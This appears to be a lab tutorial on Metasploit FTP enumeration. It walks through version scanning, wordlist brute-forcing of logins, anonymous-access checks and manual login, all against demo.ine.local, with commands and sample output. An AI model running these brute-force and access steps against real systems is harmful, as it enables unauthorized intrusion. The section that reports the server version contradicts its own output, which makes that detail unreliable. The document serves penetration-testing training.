# 📦 Metasploit - FTP Enumeration Modules

This file explains useful **Metasploit auxiliary modules** for FTP service enumeration and login attempts.  

---

## 🎯 Purpose

These modules help you:  
- Detect FTP service version  
- Brute-force login credentials  
- Test anonymous login access  
- Interact with FTP manually  

---

## 🗂️ FTP Enumeration Modules Summary

| #  | Module / Tool     | What it Does                           |
|----|-------------------|----------------------------------------|
| 1  | ftp_version       | Detect FTP server version              |
| 2  | ftp_login         | Brute-force FTP login with wordlists   |
| 3  | ftp/anonymous     | Check if anonymous login is allowed    |
| 4  | ftp client        | Manual login and interaction           |

---

## 🔎 1. Detect FTP Version

**Module:**
```bash
auxiliary/scanner/ftp/ftp_version
```

**Commands:**
```bash
use auxiliary/scanner/ftp/ftp_version
set RHOSTS demo.ine.local
run
```

📸 **Sample Output:**
```
[+] 192.228.115.3:21 - FTP Server: vsFTPd 3.0.3
```

🔍 **Interpretation:**
- The FTP service is running ** ProFTPD 1.3.5a**.  
- Version info is useful to check for known vulnerabilities.  

---

## 🔐 2. Brute-force FTP Login

**Module:**
```bash
auxiliary/scanner/ftp/ftp_login
```

**Commands:**
```bash
use auxiliary/scanner/ftp/ftp_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run
```

📸 **Sample Output:**
```
[+] 10.6.18.10:21 - Login Successful: user:password123
```

🔍 **Interpretation:**
- Found valid credentials → `user:password123`.  
- Can be used to log in manually or escalate privileges.  

---

## 👤 3. Check Anonymous Login

**Module:**
```bash
auxiliary/scanner/ftp/anonymous
```

**Commands:**
```bash
use auxiliary/scanner/ftp/anonymous
set RHOSTS demo.ine.local
run
```

📸 **Sample Output:**
```
[+] 10.6.18.10:21 - Anonymous READ/WRITE access allowed
```

🔍 **Interpretation:**
- Anonymous login is enabled.  
- Some servers allow `ftp` / `anonymous` login with no password or email.  
- Dangerous misconfiguration → attacker can upload or download files.  

---

## 📂 4. Manual FTP Interaction
```bash
ftp demo.ine.local
```

📸 **Sample Output:**
```
Connected to demo.ine.local.
220 (vsFTPd 3.0.3)
Name (demo.ine.local:kali): user
331 Please specify the password.
Password: password123
230 Login successful.
ftp>
```

🔍 **Interpretation:**
- Manually logged in to FTP using discovered credentials.  
- You can now run FTP commands:  
  - `ls` → list files  
  - `get file.txt` → download  
  - `put file.txt` → upload  
